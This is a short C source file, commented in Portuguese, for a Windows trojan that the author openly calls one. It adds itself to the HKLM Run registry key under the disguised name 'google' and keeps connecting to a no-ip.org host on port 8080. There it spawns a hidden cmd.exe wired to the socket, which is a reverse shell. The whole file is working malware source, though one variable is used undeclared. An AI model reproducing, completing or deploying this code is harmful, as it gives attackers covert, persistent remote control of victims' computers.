/* Trojanzinho tosco para Win32 com Connect Back - Novembro/2009 */

#include <stdio.h>
#include <process.h>
#include <string.h>
#include <windows.h>
#include <winreg.h>

#define CASA "meuserver.no-ip.org"
#pragma comment(lib, "ws2_32")
int ETtelefoneCASA(char *_ip, short _porta);
char *Traduz(char *Host);

int main(int argc, char*argv[]) { /* WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR CmdLine, int reserved) */
    HKEY hkey;
    size_t tamanho;
    char * buffer;
    if(argc < 1) { return 1; /* nao foi possivel pegar o nome do binario... */ }
    meunome = argv[0];
    tamanho = strlen(argv[0]);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey) == ERROR_SUCCESS) {
        RegSetValueEx(hkey, "google", 0, REG_SZ, meunome, tamanho);
        RegCloseKey(hkey);
    }
    while (1) {
        ETtelefoneCASA(Traduz(CASA), (short) 8080);
        Sleep(200);
    }
    return 0;
}

int ETtelefoneCASA(char *_ip, short _porta) {
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in Winsock_In;
    STARTUPINFO start_proc;
    PROCESS_INFORMATION info_proc;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
    Winsock_In.sin_port = htons(_porta);
    Winsock_In.sin_family = AF_INET;
    Winsock_In.sin_addr.s_addr = inet_addr(_ip);
    if (Winsock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }
    if (WSAConnect(Winsock, (SOCKADDR *) & Winsock_In, sizeof (Winsock_In), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        WSACleanup();
        return 1;
    }
    memset(&start_proc, 0, sizeof (start_proc));
    start_proc.cb = sizeof (start_proc);
    start_proc.dwFlags = STARTF_USESTDHANDLES + STARTF_USESHOWWINDOW;
    start_proc.hStdInput = start_proc.hStdOutput = start_proc.hStdError = (HANDLE) Winsock;
    start_proc.wShowWindow = SW_HIDE;
    if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &start_proc, &info_proc) == 0) {
        WSACleanup();
        closesocket(Winsock);
        return 1;
    }
    WaitForSingleObject(info_proc.hProcess, INFINITE);
    closesocket(Winsock);
    WSACleanup();
    return 0;
}

char *Traduz(char *Host) {
    WSADATA wsaData;
    struct hostent *Dire;
    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0
            || (Dire = gethostbyname(Host)) == NULL) {
        return NULL;
    }
    return inet_ntoa(*((struct in_addr *) Dire->h_addr));
}
